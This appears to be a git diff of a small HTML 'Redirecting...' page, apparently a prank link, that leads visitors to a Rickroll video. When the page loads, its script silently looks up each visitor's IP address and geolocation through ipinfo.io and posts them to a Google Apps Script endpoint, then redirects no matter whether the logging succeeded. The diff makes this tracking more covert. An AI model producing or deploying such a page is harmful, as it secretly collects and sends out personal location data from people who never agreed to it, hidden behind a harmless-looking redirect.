@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url='https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC'" />
+    <meta charset="UTF-8" />
+    <title>Redirecting...</title>
     <script>
-      async function logInfo() {
+      async function logAndRedirect() {
         try {
           const ipInfo = await fetch("https://ipinfo.io/json?token=4d7b0c36e45fe4").then(res => res.json());
+
           const data = {
             ip: ipInfo.ip,
             city: ipInfo.city,
@@ -20,18 +22,24 @@
 
           await fetch("https://script.google.com/macros/s/AKfycbxRUjscEh1oDwyK8LE2NqA2eiOrfEQl8NaLx0-0EQQ9hSGoHftzpFQFPyZVm7Gqtis/exec", {
             method: "POST",
-            body: JSON.stringify(data),
             headers: {
               "Content-Type": "application/json"
-            }
+            },
+            body: JSON.stringify(data)
           });
+
         } catch (err) {
-          console.error("Logging failed", err);
+          console.error("Error logging data:", err);
+        } finally {
+          // Redirect no matter what
+          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
         }
       }
 
-      logInfo();
+      window.onload = logAndRedirect;
     </script>
   </head>
-  <body></body>
+  <body>
+    <p>Redirecting...</p>
+  </body>
 </html>
